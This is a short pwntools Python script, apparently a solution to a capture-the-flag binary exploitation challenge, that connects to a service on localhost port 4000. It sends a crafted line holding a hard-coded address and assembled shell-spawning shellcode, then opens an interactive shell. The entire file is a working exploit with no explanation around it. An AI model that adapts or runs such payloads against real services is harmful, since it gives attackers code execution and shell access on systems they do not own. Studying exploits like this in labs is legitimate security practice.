#!/bin/env python
from pwn import *
context.arch='amd64'
r=remote('127.0.0.1',4000)
r.recv()
#sh=pwnlib.shellcraft.amd64.linux.sh()
sh=shellcraft.sh()
r.sendline('10'+' '+'a'*5+p32(0x6010d0)+'\x00'*4+asm(sh))
r.recv()
r.sendline('1 2')
#r.recv()
r.interactive()
